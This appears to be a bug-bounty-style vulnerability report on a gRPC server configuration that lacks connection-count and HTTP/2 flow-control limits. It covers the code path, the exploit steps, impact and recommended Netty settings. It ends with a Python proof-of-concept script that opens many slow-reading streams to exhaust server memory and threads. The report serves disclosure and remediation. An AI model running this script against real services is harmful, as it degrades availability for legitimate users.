### Title
Unbounded Connection Count + Absent HTTP/2 Flow-Control Tuning Enables Buffer-Bloat Griefing in `grpcServerConfigurer()`

### Summary
`grpcServerConfigurer()` applies only a single Netty constraint (`maxConcurrentCallsPerConnection = 5`) and leaves every other HTTP/2 transport parameter at library defaults. Because there is no limit on the number of inbound TCP connections and no `flowControlWindow`, `maxConnectionAge`, or `maxConnectionIdle` tuning, an unprivileged attacker can open an unbounded number of connections, saturate the per-connection stream quota with slow-consumer subscriptions, and force the server's Netty write buffers to fill to the default 1 MB flow-control window per stream — degrading latency for all legitimate users without any authentication requirement.

### Finding Description
**Exact code path**

`grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java` lines 28–35:
```java
return serverBuilder -> {
    serverBuilder.executor(applicationTaskExecutor);
    serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
};
```
`grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java` line 14:
```java
private int maxConcurrentCallsPerConnection = 5;
```

**Root cause**

`NettyServerBuilder` exposes `flowControlWindow()`, `maxConnectionAge()`, `maxConnectionIdle()`, `maxInboundMessageSize()`, and `permitKeepAliveTime()`. None of these are called. The only guard is `maxConcurrentCallsPerConnection = 5`, which is a *per-connection* limit, not a *total* or *per-IP* limit. There is no mechanism that bounds how many TCP connections a single client may open.

**Exploit flow**

1. Attacker opens *K* TCP connections to port 5600 (no IP-level or total-connection limit exists).
2. On each connection the attacker issues 5 `subscribeTopic` RPCs (the per-connection maximum), targeting a high-throughput topic.
3. The attacker's client deliberately reads responses at a near-zero rate (e.g., never calling `read()` on the socket, or using a tiny TCP receive window).
4. gRPC-Java's Netty transport buffers outbound frames until the HTTP/2 flow-control window is exhausted. With the default 1 MB stream window, each of the 5K streams can accumulate up to 1 MB of buffered data server-side.
5. Netty I/O threads and the `applicationTaskExecutor` threads block on `Channel.write()` waiting for window credits that never arrive.
6. Thread-pool saturation and heap pressure from buffered `ByteBuf` objects cause GC pauses and queuing delays for all concurrent legitimate subscribers.

**Why the existing check is insufficient**

`maxConcurrentCallsPerConnection = 5` reduces the *per-connection* blast radius but does nothing to cap the *aggregate* number of streams. With *K* connections the attacker controls 5K concurrent streams. There is no `maxConnections`, no per-IP connection throttle, no `maxConnectionIdle` to reclaim stale connections, and no reduced `flowControlWindow` to shrink per-stream buffer headroom.

### Impact Explanation
The primary service exposed is `subscribeTopic`, a long-lived server-streaming RPC. Buffer bloat on thousands of attacker-controlled streams consumes Netty direct memory (off-heap `ByteBuf` pools), occupies executor threads waiting for flow-control credits, and increases GC pressure — all of which manifest as increased tail latency and potential `OutOfMemoryError` for legitimate subscribers. No authentication or special privilege is required. The impact is classified as griefing (service degradation) with no direct economic damage to network participants, consistent with the stated scope.

### Likelihood Explanation
The attack requires only a standard gRPC client library and the ability to open many TCP connections — trivially achievable from a single machine or a small botnet. The `subscribeTopic` endpoint is intentionally public. The slow-consumer technique is well-documented and requires no exploit code beyond a loop that opens connections and suppresses reads. The attack is repeatable and stateless from the attacker's perspective.

### Recommendation
Apply the following additional `NettyServerBuilder` settings inside `grpcServerConfigurer()`:

1. **Reduce the flow-control window** — `serverBuilder.flowControlWindow(65_536)` (64 KB, the HTTP/2 spec default) instead of the gRPC-Java 1 MB default, to shrink per-stream buffer headroom.
2. **Cap connection lifetime** — `serverBuilder.maxConnectionAge(Duration, TimeUnit)` (e.g., 5 minutes) and `serverBuilder.maxConnectionAgeGrace(Duration, TimeUnit)` to recycle long-lived attacker connections.
3. **Evict idle connections** — `serverBuilder.maxConnectionIdle(Duration, TimeUnit)` (e.g., 60 seconds) to close connections that are not actively consuming data.
4. **Bound inbound message size** — `serverBuilder.maxInboundMessageSize(4096)` since `subscribeTopic` requests are tiny protobuf messages; this prevents large-frame attacks.
5. **Add `NettyProperties` fields** for all of the above so operators can tune them without recompilation, mirroring the existing `maxConcurrentCallsPerConnection` pattern.

### Proof of Concept
```python
import grpc
import threading
from com.hedera.mirror.api.proto import consensus_service_pb2_grpc, mirror_network_service_pb2

TARGET = "grpc-host:5600"
CONNECTIONS = 200   # K connections
STREAMS_PER_CONN = 5

def slow_subscriber(stub):
    req = mirror_network_service_pb2.ConsensusTopicQuery(topicID=...)
    # Never read: iterate but sleep forever between reads
    for _ in stub.subscribeTopic(req):
        import time; time.sleep(9999)

threads = []
for _ in range(CONNECTIONS):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    for _ in range(STREAMS_PER_CONN):
        t = threading.Thread(target=slow_subscriber, args=(stub,), daemon=True)
        t.start()
        threads.append(t)

# Server now holds 1000 open streams, each buffering up to 1 MB of unsent data.
# Monitor server GC logs and p99 latency for legitimate clients to observe degradation.
input("Attack running — press Enter to stop")
```
